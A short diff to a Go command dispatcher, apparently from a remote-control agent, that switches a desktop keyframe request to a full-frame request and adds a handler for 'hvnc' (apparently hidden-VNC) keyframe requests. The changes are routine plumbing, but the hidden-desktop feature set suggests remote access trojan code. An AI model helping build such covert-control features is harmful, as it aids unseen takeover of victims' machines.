@@ -798,8 +798,8 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
 	case "desktop_request_keyframe":
-		log.Printf("desktop: request h264 keyframe")
-		capture.RequestDesktopH264Keyframe()
+		log.Printf("desktop: request full frame")
+		capture.RequestDesktopFullFrame()
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
 	case "desktop_set_resolution":
@@ -1156,6 +1156,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		}
 		log.Printf("hvnc: set quality=%d codec=%s", quality, codec)
 		capture.SetQualityAndCodec(quality, codec)
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+	case "hvnc_request_keyframe":
+		log.Printf("hvnc: request full frame")
+		capture.RequestHVNCFullFrame()
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
 	case "hvnc_mouse_move":
